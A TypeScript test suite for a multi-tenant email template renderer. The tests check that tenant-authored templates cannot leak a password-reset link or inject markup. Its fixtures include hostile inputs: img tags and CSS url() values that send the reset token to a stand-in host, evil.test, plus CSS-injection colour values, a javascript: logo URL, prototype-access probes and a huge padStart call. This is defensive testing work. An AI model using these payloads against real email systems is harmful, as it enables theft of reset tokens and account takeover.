import { z } from 'zod';
import { createEmailRenderer } from '../email-renderer';
import { defineEmail } from '../email.types';

const renderer = createEmailRenderer();

const reset = defineEmail({
  key: 'core.password-reset',
  scope: 'tenant',
  name: 'Password reset',
  description: 'test',
  variables: z.object({ resetUrl: z.string(), name: z.string() }),
  sample: { resetUrl: 'https://app.test/reset-password?token=s1&tenant=acme', name: 'Budi' },
  required: ['resetUrl'],
  sensitive: ['resetUrl'],
  defaults: {
    en: { subject: 'Reset your password', html: '<p>Hi {{name}}</p>{{button resetUrl "Reset password"}}' },
    id: { subject: 'Atur ulang kata sandi', html: '<p>Hai {{name}}</p>{{button resetUrl "Atur ulang"}}' },
  },
});

const layout = { brandName: 'Acme', logoUrl: 'https://cdn.test/logo.png', primaryColor: '#123456', footerText: 'Sent by Acme' };
const tenant = { tenantAuthored: true };

describe('email renderer — check', () => {
  it('accepts the default content', () => {
    expect(renderer.check(reset, reset.defaults.en, { tenantAuthored: false })).toEqual([]);
  });

  it('rejects {{{triple}}} and {{& x}} in tenant content', () => {
    expect(renderer.check(reset, { subject: 'S', html: '{{{name}}}{{button resetUrl "R"}}' }, tenant)).not.toEqual([]);
    expect(renderer.check(reset, { subject: 'S', html: '{{& name}}{{button resetUrl "R"}}' }, tenant)).not.toEqual([]);
  });

  it('rejects partials', () => {
    expect(renderer.check(reset, { subject: 'S', html: '{{> header}}{{button resetUrl "R"}}' }, tenant)).not.toEqual([]);
  });

  it('rejects an unknown helper with arguments', () => {
    const problems = renderer.check(reset, { subject: 'S', html: '{{lookup this "name"}}{{button resetUrl "R"}}' }, tenant);

    expect(problems.join(' ')).toMatch(/lookup/);
  });

  it('accepts the formatting helpers and block helpers in tenant content', () => {
    const html = '{{#if name}}<p>{{uppercase name}}</p>{{/if}}{{#ifCond name "==" "Budi"}}<b>hi</b>{{/ifCond}}{{button resetUrl "R"}}';

    expect(renderer.check(reset, { subject: 'Hi {{capitalize name}}', html }, tenant)).toEqual([]);
  });

  it('reports a template syntax error', () => {
    expect(renderer.check(reset, { subject: 'S', html: '{{#if name}}<p>x</p>{{button resetUrl "R"}}' }, tenant)).not.toEqual([]);
  });

  it('reports a missing required variable', () => {
    expect(renderer.check(reset, { subject: 'S', html: '<p>Hi {{name}}</p>' }, tenant)).toEqual(['"resetUrl" must stay in the email']);
  });

  it('reports a sensitive variable hidden in an img', () => {
    const html = '{{button resetUrl "Reset"}}<img src="https://evil.test/x.png?u={{resetUrl}}">';

    expect(renderer.check(reset, { subject: 'S', html }, tenant)).toEqual(['"resetUrl" may only be used as a link address']);
  });

  it('accepts a sensitive variable as a plain link href', () => {
    expect(renderer.check(reset, { subject: 'S', html: '<a href="{{resetUrl}}">Reset</a>' }, tenant)).toEqual([]);
  });
});

describe('email renderer — sensitive links (templates never see the real value)', () => {
  const B = '{{button resetUrl "R"}}';

  it.each([
    ['capitalize', `<img src="https://evil.test/p.png?u={{capitalize resetUrl}}">${B}`],
    ['uppercase', `<img src="https://evil.test/p.png?u={{uppercase resetUrl}}">${B}`],
    ['lowercase', `<img src="https://evil.test/p.png?u={{lowercase resetUrl}}">${B}`],
    ['#each this', `{{#each this}}{{#if (eq @key "resetUrl")}}<img src="https://evil.test/p.png?u={{capitalize this}}">{{/if}}{{/each}}${B}`],
    ['a style url()', `<div style="background:url('https://evil.test/{{capitalize resetUrl}}')">x</div>${B}`],
    ['json', `<p>{{json this}}</p>${B}`],
    ['an attribute name', `<img src="https://evil.test/p.png" {{resetUrl}}>${B}`],
  ])('a copy of the link through %s is refused', (_how, html) => {
    expect(renderer.check(reset, { subject: 'S', html }, tenant)).not.toEqual([]);
  });

  it('a required link hidden behind a false condition is refused', () => {
    expect(renderer.check(reset, { subject: 'S', html: `{{#if false}}${B}{{/if}}<p>no link</p>` }, tenant))
      .toEqual(['"resetUrl" must stay in the email as a link']);
    expect(renderer.check(reset, { subject: 'S', html: '{{#if resetUrl}}{{/if}}' }, tenant))
      .toEqual(['"resetUrl" must stay in the email as a link']);
  });

  it('the real value is written only into the link hrefs; a helper sees only a placeholder', () => {
    const data = { name: 'Budi', resetUrl: 'https://app.test/reset-password?token=abc123&tenant=acme' };
    const out = renderer.render(
      { subject: 'S', html: `<p>{{#if (eq resetUrl "${data.resetUrl}")}}SAW-IT{{else}}PLACEHOLDER{{/if}}</p>{{button resetUrl "Reset"}}` },
      data, layout, { tenantAuthored: false, sensitive: ['resetUrl'] },
    );

    // Comparisons can't probe the token either: the template compared a placeholder
    expect(out.html).toContain('<p>PLACEHOLDER</p>');
    expect(out.html).toContain('href="https://app.test/reset-password?token&#x3D;abc123&amp;tenant&#x3D;acme"');
  });

  it('render refuses to fill a template that misplaces a sensitive value', () => {
    expect(() => renderer.render(
      { subject: 'S', html: '<img src="https://evil.test/?{{resetUrl}}">{{button resetUrl "R"}}' },
      { name: 'x', resetUrl: 'https://app.test/r' }, layout, { sensitive: ['resetUrl'] },
    )).toThrow('may only be used as a link address');
  });

  it('a default that throws with its sample data is reported (every definition is rendered)', () => {
    const broken = defineEmail({ ...reset, key: 'core.broken', sensitive: [], required: [], defaults: {
      en: { subject: 'S', html: '{{formatNumber 1 1000}}' }, id: { subject: 'S', html: 'x' },
    } });
    expect(renderer.check(broken, broken.defaults.en, { tenantAuthored: false })).not.toEqual([]);
  });
});

describe('email renderer — render', () => {
  it('escapes data in {{ }}', () => {
    const out = renderer.render({ subject: 'S', html: '<p>{{name}}</p>' }, { name: '<b>x</b>' }, layout);

    expect(out.html).toContain('<p>&lt;b&gt;x&lt;/b&gt;</p>');
  });

  it('button renders an escaped href', () => {
    const out = renderer.render({ subject: 'S', html: '{{button url label}}' }, { url: 'https://a.test/?x="1"', label: '<Go>' }, layout);

    expect(out.html).toContain('href="https://a.test/?x&#x3D;&quot;1&quot;"');
    expect(out.html).toContain('&lt;Go&gt;');
  });

  it('the button uses the brand colour, and the default when there is none or it is not a hex colour', () => {
    const source = { subject: 'S', html: '{{button url "Go"}}' };
    const data = { url: 'https://a.test' };

    expect(renderer.render(source, data, { ...layout, primaryColor: '#123456' }).html).toContain('background-color:#123456;"><a');
    expect(renderer.render(source, data, { ...layout, primaryColor: null }).html).toContain('background-color:#4f46e5;"><a');
    const injected = renderer.render(source, data, { ...layout, primaryColor: 'red;background:url(https://evil.test/)' }).html;
    expect(injected).not.toContain('evil.test');
    expect(injected).toContain('background-color:#4f46e5;"><a');
  });

  it('render wraps the body in the layout with the brand name and logo', () => {
    const out = renderer.render({ subject: 'S', html: '<p>Body here</p>' }, {}, layout);

    expect(out.html).toMatch(/^<!DOCTYPE html>/);
    expect(out.html).toContain('<p>Body here</p>');
    expect(out.html).toContain('src="https://cdn.test/logo.png"');
    expect(out.html).toContain('Sent by Acme');
    expect(out.html).toContain('#123456');
  });

  it('the layout ignores a logo that is not http(s) and a colour that is not a hex colour', () => {
    const out = renderer.render({ subject: 'S', html: '<p>x</p>' }, {}, { ...layout, logoUrl: 'javascript:alert(1)', primaryColor: 'red;background:url(https://evil.test)' });

    expect(out.html).not.toContain('javascript:');
    expect(out.html).not.toContain('evil.test');
  });

  it('render produces a plain-text part containing the link', () => {
    const out = renderer.render(reset.defaults.en, reset.sample, layout);

    expect(out.text).toContain('Hi Budi');
    expect(out.text).toContain('https://app.test/reset-password?token=s1&tenant=acme');
  });

  it('the subject is plain text on one line: not HTML-escaped, newlines collapsed', () => {
    const out = renderer.render({ subject: 'Invoice for {{name}}\n now', html: '' }, { name: 'R&D <Ltd>' }, layout);

    expect(out.subject).toBe('Invoice for R&D <Ltd> now');
  });

  it('padStart is capped, so a template cannot build a huge string (one preview could exhaust the API)', () => {
    const out = renderer.render({ subject: 'S', html: '<p>{{padStart "7" 5000000 "0"}}</p>' }, {}, layout);

    expect(out.html.length).toBeLessThan(20_000);
    expect(out.html).toContain(`<p>${'0'.repeat(999)}7</p>`);
  });

  it('render does not allow prototype access', () => {
    const out = renderer.render({ subject: 'S', html: '<p>[{{constructor.name}}]</p>' }, {}, layout);

    expect(out.html).toContain('<p>[]</p>');
  });
});
